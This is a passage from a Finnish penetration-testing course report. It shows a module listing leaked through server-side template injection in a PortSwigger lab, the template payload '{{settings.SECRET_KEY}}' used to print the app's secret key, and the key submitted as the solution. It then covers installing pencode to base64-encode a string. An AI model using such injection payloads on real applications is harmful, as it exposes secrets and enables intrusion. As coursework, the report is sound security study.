'encodings.encodings': None, 'encodings.utf_8': <module 'encodings.utf_8' from '/usr/lib/python2.7/encodings/utf_8.pyc'>, 'errno': <module 'errno' (built-in)>, 'exceptions': <module 'exceptions' (built-in)>, 'fcntl': <module 'fcntl' (built-in)>, 'fnmatch': <module 'fnmatch' from '/usr/lib/python2.7/fnmatch.pyc'>, 'functools': <module 'functools' from '/usr/lib/python2.7/functools.pyc'>, 'gc': <module 'gc' (built-in)>, 'genericpath': <module 'genericpath' from '/usr/lib/python2.7/genericpath.pyc'>, 'gettext': <module 'gettext' from '/usr/lib/python2.7/gettext.pyc'>, 'grp': <module 'grp' (built-in)>, 'gzip': <module 'gzip' from '/usr/lib/python2.7/gzip.pyc'>, 'hashlib': <module 'hashlib' from '/usr/lib/python2.7/hashlib.pyc'>, 'heapq': <module 'heapq' from '/usr/lib/python2.7/heapq.pyc'>, 'hmac': <module 'hmac' from '/usr/lib/python2.7/hmac.pyc'>, 'htmlentitydefs': <module 'htmlentitydefs' from '/usr/lib/python2.7/htmlentitydefs.pyc'>, 'httplib': <module 'httplib' from '/usr/lib/python2.7/httplib.pyc'>, 'imp': <module 'imp' (built-in)>, 'importlib': <module 'importlib' from '/usr/lib/python2.7/importlib/__init__.pyc'>, 'importlib.sys': None, 'inspect': <module 'inspect' from '/usr/lib/python2.7/inspect.pyc'>, 'io': <module 'io' from '/usr/lib/python2.7/io.pyc'>, 'itertools': <module 'itertools' (built-in)>, 'jinja2': <module 'jinja2' from '/usr/local/lib/python2.7/dist-packages/jinja2/__init__.pyc'>, 'jinja2._compat': <module 'jinja2._compat' from '/usr/local/lib/python2.7/dist-packages/jinja2/_compat.pyc'>, 'jinja2.ast': None, 'jinja2.bccache': <module 'jinja2.bccache' from '/usr/local/lib/python2.7/dist-packages/jinja2/bccache.pyc'>, 'jinja2.cPickle': None, 'jinja2.cStringIO': None, 'jinja2.collections': None, 'jinja2.compiler': <module 'jinja2.compiler' from '/usr/local/lib/python2.7/dist-packages/jinja2/compiler.pyc'>, 'jinja2.decimal': None, 'jinja2.defaults': <module 'jinja2.defaults' from '/usr/local/lib/python2.7/dist-packages/jinja2/defaults.pyc'>, 'jinja2.environment': <module 'jinja2.environment' from '/usr/local/lib/python2.7/dist-packages/jinja2/environment.pyc'>, 'jinja2.errno': None, 'jinja2.exceptions': <module 'jinja2.exceptions' from '/usr/local/lib/python2.7/dist-packages/jinja2/exceptions.pyc'>, 'jinja2.filters': <module 'jinja2.filters' from '/usr/local/lib/python2.7/dist-packages/jinja2/filters.pyc'>, 'jinja2.fnmatch': None, 'jinja2.functools': None, 'jinja2.hashlib': None, 'jinja2.idtracking': <module 'jinja2.idtracking' from '/usr/local/lib/python2.7/dist-packages/jinja2/idtracking.pyc'>, 'jinja2.itertools': None, 'jinja2.json': None, 'jinja2.keyword': None, 'jinja2.lexer': <module 'jinja2.lexer' from '/usr/local/lib/python2.7/dist-packages/jinja2/lexer.pyc'>, 'jinja2.loaders': <module 'jinja2.loaders' from '/usr/local/lib/python2.7/dist-packages/jinja2/loaders.pyc'>, 'jinja2.markupsafe': None, 'jinja2.marshal': None, 'jinja2.math': None, 'jinja2.nodes': <module 'jinja2.nodes' from '/usr/local/lib/python2.7/dist-packages/jinja2/nodes.pyc'>, 'jinja2.operator': None, 'jinja2.optimizer': <module 'jinja2.optimizer' from '/usr/local/lib/python2.7/dist-packages/jinja2/optimizer.pyc'>, 'jinja2.os': None, 'jinja2.parser': <module 'jinja2.parser' from '/usr/local/lib/python2.7/dist-packages/jinja2/parser.pyc'>, 'jinja2.random': None, 'jinja2.re': None, 'jinja2.runtime': <module 'jinja2.runtime' from '/usr/local/lib/python2.7/dist-packages/jinja2/runtime.pyc'>, 'jinja2.stat': None, 'jinja2.string': None, 'jinja2.sys': None, 'jinja2.tempfile': None, 'jinja2.tests': <module 'jinja2.tests' from '/usr/local/lib/python2.7/dist-packages/jinja2/tests.pyc'>, 'jinja2.threading': None, 'jinja2.types': None, 'jinja2.urllib': None, 'jinja2.utils': <module 'jinja2.utils' from '/usr/local/lib/python2.7/dist-packages/jinja2/utils.pyc'>, 'jinja2.visitor': <module 'jinja2.visitor' from '/usr/local/lib/python2.7/dist-packages/jinja2/visitor.pyc'>, 'jinja2.warnings': None, 'jinja2.weakref': None, 'json': <module 'json' from '/usr/lib/python2.7/json/__init__.pyc'>, 'json._json': None, 'json.decoder': <module 'json.decoder' from '/usr/lib/python2.7/json/decoder.pyc'>, 'json.encoder': <module 'json.encoder' from '/usr/lib/python2.7/json/encoder.pyc'>, 'json.json': None, 'json.re': None, 'json.scanner': <module 'json.scanner' from '/usr/lib/python2.7/json/scanner.pyc'>, 'json.struct': None, 'json.sys': None, 'keyword': <module 'keyword' from '/usr/lib/python2.7/keyword.pyc'>, 'linecache': <module 'linecache' from '/usr/lib/python2.7/linecache.pyc'>, 'locale': <module 'locale' from '/usr/lib/python2.7/locale.pyc'>, 'logging': <module 'logging' from '/usr/lib/python2.7/logging/__init__.pyc'>, 'logging.SocketServer': None, 'logging.atexit': None, 'logging.cPickle': None, 'logging.cStringIO': None, 'logging.codecs': None, 'logging.collections': None, 'logging.config': <module 'logging.config' from '/usr/lib/python2.7/logging/config.pyc'>, 'logging.errno': None, 'logging.handlers': <module 'logging.handlers' from '/usr/lib/python2.7/logging/handlers.pyc'>, 'logging.io': None, 'logging.logging': None, 'logging.os': None, 'logging.re': None, 'logging.socket': None, 'logging.stat': None, 'logging.struct': None, 'logging.sys': None, 'logging.thread': None, 'logging.threading': None, 'logging.time': None, 'logging.traceback': None, 'logging.types': None, 'logging.warnings': None, 'logging.weakref': None, 'markupbase': <module 'markupbase' from '/usr/lib/python2.7/markupbase.pyc'>, 'markupsafe': <module 'markupsafe' from '/usr/local/lib/python2.7/dist-packages/markupsafe/__init__.pyc'>, 'markupsafe._compat': <module 'markupsafe._compat' from '/usr/local/lib/python2.7/dist-packages/markupsafe/_compat.pyc'>, 'markupsafe._speedups': <module 'markupsafe._speedups' from '/usr/local/lib/python2.7/dist-packages/markupsafe/_speedups.so'>, 'markupsafe.collections': None, 'markupsafe.re': None, 'markupsafe.string': None, 'markupsafe.sys': None, 'marshal': <module 'marshal' (built-in)>, 'math': <module 'math' (built-in)>, 'mimetools': <module 'mimetools' from '/usr/lib/python2.7/mimetools.pyc'>, 'mimetypes': <module 'mimetypes' from '/usr/lib/python2.7/mimetypes.pyc'>, 'numbers': <module 'numbers' from '/usr/lib/python2.7/numbers.pyc'>, 'opcode': <module 'opcode' from '/usr/lib/python2.7/opcode.pyc'>, 'operator': <module 'operator' (built-in)>, 'os': <module 'os' from '/usr/lib/python2.7/os.pyc'>, 'os.path': <module 'posixpath' from '/usr/lib/python2.7/posixpath.pyc'>, 'pickle': <module 'pickle' from '/usr/lib/python2.7/pickle.pyc'>, 'pkgutil': <module 'pkgutil' from '/usr/lib/python2.7/pkgutil.pyc'>, 'posix': <module 'posix' (built-in)>, 'posixpath': <module 'posixpath' from '/usr/lib/python2.7/posixpath.pyc'>, 'pprint': <module 'pprint' from '/usr/lib/python2.7/pprint.pyc'>, 'pwd': <module 'pwd' (built-in)>, 'pytz': <module 'pytz' from '/usr/local/lib/python2.7/dist-packages/pytz/__init__.pyc'>, 'pytz.UserDict': None, 'pytz.bisect': None, 'pytz.collections': None, 'pytz.datetime': None, 'pytz.exceptions': <module 'pytz.exceptions' from '/usr/local/lib/python2.7/dist-packages/pytz/exceptions.pyc'>, 'pytz.lazy': <module 'pytz.lazy' from '/usr/local/lib/python2.7/dist-packages/pytz/lazy.pyc'>, 'pytz.os': None, 'pytz.pytz': None, 'pytz.struct': None, 'pytz.sys': None, 'pytz.threading': None, 'pytz.tzfile': <module 'pytz.tzfile' from '/usr/local/lib/python2.7/dist-packages/pytz/tzfile.pyc'>, 'pytz.tzinfo': <module 'pytz.tzinfo' from '/usr/local/lib/python2.7/dist-packages/pytz/tzinfo.pyc'>, 'quopri': <module 'quopri' from '/usr/lib/python2.7/quopri.pyc'>, 'random': <module 'random' from '/usr/lib/python2.7/random.pyc'>, 're': <module 're' from '/usr/lib/python2.7/re.pyc'>, 'rfc822': <module 'rfc822' from '/usr/lib/python2.7/rfc822.pyc'>, 'select': <module 'select' (built-in)>, 'shutil': <module 'shutil' from '/usr/lib/python2.7/shutil.pyc'>, 'signal': <module 'signal' (built-in)>, 'site': <module 'site' from '/usr/lib/python2.7/site.pyc'>, 'sitecustomize': <module 'sitecustomize' from '/usr/lib/python2.7/sitecustomize.pyc'>, 'socket': <module 'socket' from '/usr/lib/python2.7/socket.pyc'>, 'sre_compile': <module 'sre_compile' from '/usr/lib/python2.7/sre_compile.pyc'>, 'sre_constants': <module 'sre_constants' from '/usr/lib/python2.7/sre_constants.pyc'>, 'sre_parse': <module 'sre_parse' from '/usr/lib/python2.7/sre_parse.pyc'>, 'ssl': <module 'ssl' from '/usr/lib/python2.7/ssl.pyc'>, 'stat': <module 'stat' from '/usr/lib/python2.7/stat.pyc'>, 'string': <module 'string' from '/usr/lib/python2.7/string.pyc'>, 'strop': <module 'strop' (built-in)>, 'struct': <module 'struct' from '/usr/lib/python2.7/struct.pyc'>, 'subprocess': <module 'subprocess' from '/usr/lib/python2.7/subprocess.pyc'>, 'sys': <module 'sys' (built-in)>, 'sysconfig': <module 'sysconfig' from '/usr/lib/python2.7/sysconfig.pyc'>, 'tempfile': <module 'tempfile' from '/usr/lib/python2.7/tempfile.pyc'>, 'termios': <module 'termios' from '/usr/lib/python2.7/lib-dynload/termios.x86_64-linux-gnu.so'>, 'textwrap': <module 'textwrap' from '/usr/lib/python2.7/textwrap.pyc'>, 'thread': <module 'thread' (built-in)>, 'threading': <module 'threading' from '/usr/lib/python2.7/threading.pyc'>, 'time': <module 'time' (built-in)>, 'token': <module 'token' from '/usr/lib/python2.7/token.pyc'>, 'tokenize': <module 'tokenize' from '/usr/lib/python2.7/tokenize.pyc'>, 'traceback': <module 'traceback' from '/usr/lib/python2.7/traceback.pyc'>, 'types': <module 'types' from '/usr/lib/python2.7/types.pyc'>, 'unicodedata': <module 'unicodedata' (built-in)>, 'urllib': <module 'urllib' from '/usr/lib/python2.7/urllib.pyc'>, 'urlparse': <module 'urlparse' from '/usr/lib/python2.7/urlparse.pyc'>, 'uu': <module 'uu' from '/usr/lib/python2.7/uu.pyc'>, 'uuid': <module 'uuid' from '/usr/lib/python2.7/uuid.pyc'>, 'warnings': <module 'warnings' from '/usr/lib/python2.7/warnings.pyc'>, 'weakref': <module 'weakref' from '/usr/lib/python2.7/weakref.pyc'>, 'zipimport': <module 'zipimport' (built-in)>, 'zlib': <module 'zlib' (built-in)>} 
```

Yksi näistä komennnoista oli settings, jonka avulla saa salaisen avaimen tulostettua. 

```{{settings.SECRET_KEY}}```

<img src="https://github.com/user-attachments/assets/5da9c35e-ddcf-4168-a3bd-02bc1ef537ea" width="500"> <br/>

<img src="https://github.com/user-attachments/assets/f113824c-81e7-4e8b-811b-88456f192701" width="500"> <br/>

Sivuille ilmestyikin }}```o0ufa5j7zm2y973rh2i4w0beroyo0p5k``` joka on oletettavassti salainen avain. Tämän jälkeen menin sivulla olevaan ```Submit solution``` -sivulle ja syötin siihen avaimen. 

```o0ufa5j7zm2y973rh2i4w0beroyo0p5k```

<img src="https://github.com/user-attachments/assets/00b0bd6f-366e-4ee0-9acd-636851f1347c" width="500"> <br/>

<img src="https://github.com/user-attachments/assets/ace8328e-f685-4a0c-993c-59ffaa82b935" width="500"> <br/>

## k) Vapaaehtoinen, helppo: Asenna pencode ja muunna sillä jokin merkkijono (encode a string).

Aloitin yrittämällä asentaa sen suoraan paketinhallinnasta. 

```sudo apt-get install pencode```

![k1](https://github.com/user-attachments/assets/5b8b2310-1d35-4a86-8c46-45f66bc44a65)

Tätä ei kuitenkaan löytynyt, joten yritin hakea sitä vielä paketinhallinnasta. 

```apt-cache search pencode```

<img src="https://github.com/user-attachments/assets/b482a9e4-836d-4931-b6a8-07a99644a403" width="500"> <br/>

```sudo apt-get install golang-github-ffuf-pencode-dev```

Tämän jälkeen ajoin komennon muuntaakseni haluamani merkkijonon base64 muotoon. 

```echo 'encrypt me' | pencode b64encode```

```ZW5jcnlwdCBtZQ==```

![k3](https://github.com/user-attachments/assets/0d8d7d99-a1b0-4c05-959b-0593dfd3e9e9)


## Ajankäyttö: 

- Materiaalien lukemiseen ja tiivistämiseen n. 2h. 
- Tehtäviin n. 4h. 
- Raportointiin ja dokumentointiin n. 2h. 

## Lähteet: 

Karvinen, T. 2025. Tunkeutumistestaus.    
https://terokarvinen.com/tunkeutumistestaus/    
Tehtävänanto.    

OWASP. 2021. A01:2021 – Broken Access Control.    
https://owasp.org/Top10/A01_2021-Broken_Access_Control/    
Tehtävä x.    

OWASP. 2021. A01:2021 – Broken Access Control.    
https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/    
Tehtävä x.    

PortSwigger. s.a. Insecure direct object references (IDOR).    
https://portswigger.net/web-security/access-control/idor    
Tehtävä x.    

PortSwigger. s.a. Path traversal.    
https://portswigger.net/web-security/file-path-traversal    

PortSwigger. s.a. Server-side request forgery (SSRF).    
https://portswigger.net/web-security/ssrf    
Tehtävä x.    

PortSwigger. s.a. Cross-site scripting.    
https://portswigger.net/web-security/cross-site-scripting
Tehtävä x.    

PortSwigger. s.a. Server-side template injection.    
https://portswigger.net/web-security/server-side-template-injection    
Tehtävä x.    

PortSwigger. s.a. Lab: Reflected XSS into HTML context with nothing encoded.    
https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded     
Tehtävä c.    

PortSwigger. s.a. Lab: Stored XSS into HTML context with nothing encoded.      
https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded    
Tehtävä d.    

PortSwigger. s.a. Lab: File path traversal, simple case.    
https://portswigger.net/web-security/file-path-traversal/lab-simple
Tehtävä e.    

PortSwigger. s.a. Lab: File path traversal, traversal sequences blocked with absolute path bypass.    
https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass    
Tehtävä f.    

PortSwigger. s.a. Lab: File path traversal, traversal sequences stripped non-recursively.    
https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively    
Tehtävä g.    

PortSwigger. s.a. Lab: Insecure direct object references.    
https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references    
Tehtävä h.    

PortSwigger. s.a. Lab: Basic SSRF against the local server.    
https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost    
Tehtävä i.    

Mdnn web docs. s.a. 401 Unauthorized.    
https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/401    
Tehtävä i.   

PortSwigger. s.a. Lab: Server-side template injection with information disclosure via user-supplied objects.     
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects    
Tehtävä j.    

GitHub. joohoi / pencode - complex payload encoder.    
https://github.com/ffuf/pencode    
Tehtävä k.    
